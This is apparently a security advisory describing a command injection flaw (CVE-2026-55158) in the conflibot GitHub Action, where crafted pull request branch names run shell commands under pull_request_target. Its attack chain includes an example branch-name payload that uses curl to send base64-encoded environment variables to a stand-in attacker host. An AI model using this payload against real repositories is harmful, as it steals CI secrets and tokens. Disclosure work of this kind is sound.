---
title: Command Injection in conflibot via Crafted Git Branch Names
slug: 2026-08-conflibot-command-injection
description: The conflibot GitHub Action (versions < 1.2.1) is vulnerable to command injection via attacker-controlled pull request branch names, leading to secret exfiltration when executed via pull_request_target.
date: "2026-08-17T18:46:12Z"
type: advisory
types:
  - advisory
severities:
  - critical
vendors:
  - wktk
products:
  - conflibot
mitre_ttps:
  - tactic_id: TA0001
    tactic_name: Initial Access
    technique_id: T1195.002
    technique_name: 'Supply Chain Compromise: Compromise Software Dependencies'
    evidence: anyone can open a pull request (including from a fork) whose head branch name contains shell metacharacters
    confidence_band: high
  - tactic_id: TA0002
    tactic_name: Execution
    technique_id: T1059.004
    technique_name: 'Command and Scripting Interpreter: Unix Shell'
    evidence: build git commands by string interpolation and run them through a shell
    confidence_band: high
references:
  - https://github.com/advisories/GHSA-2qvg-qr73-mqxp
  - https://github.com/wktk/conflibot/commit/0107ac6
  - https://github.com/wktk/conflibot/commit/59e255c
action_plan:
  priority: immediate_escalation
  owners:
    - IT Operations
    - Detection Engineering
  immediate_actions:
    - action: Upgrade conflibot to v2.0.0 in all GitHub Actions workflows
      owner: IT Operations
      due: 24h
      evidence: Fixed in 1.2.1 and 2.0.0
  mitigation_plan:
    - priority: immediate
      action: Rotate all repository secrets accessible to workflows using conflibot
      owner: IT Operations
      addresses: CVE-2026-55158
      evidence: crafted branch name causes arbitrary command execution on the runner
---

conflibot is a GitHub Action designed to manage and synchronize configuration files. A critical vulnerability (CVE-2026-55158) exists in versions prior to 1.2.1 where git commands are constructed using string interpolation and executed via a shell. Because the action accepts pull request branch names as inputs, an attacker can create a pull request with a maliciously crafted branch name containing shell metacharacters such as backticks, dollar signs, or semicolons.

When configured with the `pull_request_target` event, the GitHub Actions runner executes this malicious code with the base repository's context. This grants the attacker access to repository secrets and a write-scoped `GITHUB_TOKEN`. Exploitation requires no maintainer interaction and can be performed by any user capable of opening a pull request, including from a fork. This vulnerability allows for immediate secret exfiltration, unauthorized commits to the repository, or lateral movement within the CI/CD pipeline.

## Attack Chain

1. Attacker identifies a target repository utilizing `wktk/conflibot` versions prior to 1.2.1 in a workflow triggered by `pull_request_target`.
2. Attacker creates a fork of the target repository.
3. Attacker creates a new branch in the fork with a name containing shell injection payloads (e.g., `$(curl attacker.com/$(env | base64))`).
4. Attacker opens a pull request from the malicious branch to the target repository.
5. The target repository's CI workflow is triggered by the `pull_request_target` event.
6. conflibot invokes the vulnerable shell command, interpolating the malicious branch name into the command string.
7. The runner executes the injected command with the privileges of the repository's `GITHUB_TOKEN`.
8. Attacker captures exfiltrated secrets or uses the write token to modify the repository source code.

## Impact

Successful exploitation allows unauthenticated attackers to execute arbitrary commands on GitHub-hosted runners. This results in the compromise of repository secrets, exposure of environment variables, and the ability to push malicious code to the base repository. Given the nature of `pull_request_target` workflows, this impacts any organization using conflibot to automate repository management, potentially affecting thousands of projects.

## Recommendation

- Upgrade `wktk/conflibot` to version 1.2.1 or 2.0.0 immediately.
- Review workflows currently using `pull_request_target` for any usage of `wktk/conflibot` to assess potential prior secret compromise.
- Rotate all repository secrets and personal access tokens that were accessible to the compromised workflow if the repository has been targeted.
- If immediate patching is not possible, disable the affected workflow entirely until the upgrade can be performed.
